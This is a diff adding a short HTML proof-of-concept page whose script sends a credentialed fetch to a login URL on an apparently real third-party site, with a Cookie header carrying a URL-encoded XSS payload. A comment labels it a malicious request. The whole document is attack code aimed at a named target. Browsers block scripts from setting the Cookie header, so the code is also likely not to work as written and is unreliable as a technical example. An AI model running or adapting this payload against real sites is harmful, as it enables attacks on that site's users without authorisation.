@@ -1,0 +1,20 @@
+<html>
+<body>
+  <script>
+    // Create a malicious request with a cookie header containing XSS payload
+    fetch('https://enginelark.okg.com/ucentre/login/80222fd74590445c981105503458e162', {
+      method: 'GET',
+      credentials: 'include',
+      headers: {
+        'Cookie': 'turbo-cdn=XSS%22%3E%3Cscript%3Ealert(1)%3C/script%3E'
+      }
+    })
+    .then(response => response.text())
+    .then(data => {
+      // Process or send data to your server for analysis
+      console.log('Response:', data);
+    })
+    .catch(err => console.error('Error:', err));
+  </script>
+</body>
+</html>
